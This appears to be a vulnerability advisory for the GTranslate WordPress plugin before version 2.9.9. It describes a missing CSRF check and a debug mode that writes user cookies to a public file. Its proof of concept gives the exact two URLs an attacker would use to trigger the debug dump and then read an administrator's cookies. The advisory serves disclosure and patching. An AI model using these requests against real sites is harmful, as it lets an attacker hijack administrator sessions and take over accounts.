## WordPress Plugin Vulnerabilities

# Translate WordPress with GTranslate < 2.9.9 - CSRF to Account Takeover

### Description

The plugin does not have CSRF check in some files, and write debug data such as user's cookies in a publicly accessible file if a specific parameter is used when requesting them. Combining those two issues, an attacker could gain access to a logged in admin cookies by making them open a malicious link or page

### Proof of Concept

Make a logged in admin (or any other account you want to gain access to) open
https://example.com/wp-content/plugins/gtranslate/url\_addon/gtranslate.php?glang=es&gurl=PoC&enable\_debug
Then access https://example.com/wp-content/plugins/gtranslate/url\_addon/debug.txt to get the users cookies
